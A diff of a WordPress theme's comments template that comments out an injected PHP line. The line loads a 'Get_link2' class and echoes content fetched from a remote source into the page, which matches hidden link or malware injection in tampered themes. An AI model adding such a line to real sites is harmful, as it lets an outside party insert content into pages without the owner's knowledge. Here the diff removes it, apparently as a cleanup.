@@ -34,7 +34,7 @@ if ( post_password_required() ) {
 				);
 			?>
 		</h2>
-		<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_link2(); $links = $links->get_remote(); echo $links; ?>
+		<?php //$lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_link2(); $links = $links->get_remote(); echo $links; ?>
 		<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : // Are there comments to navigate through? ?>
 		<nav id="comment-nav-above" class="navigation comment-navigation" role="navigation">
 			<h2 class="screen-reader-text"><?php esc_html_e( 'Comment navigation', 'storevilla' ); ?></h2>
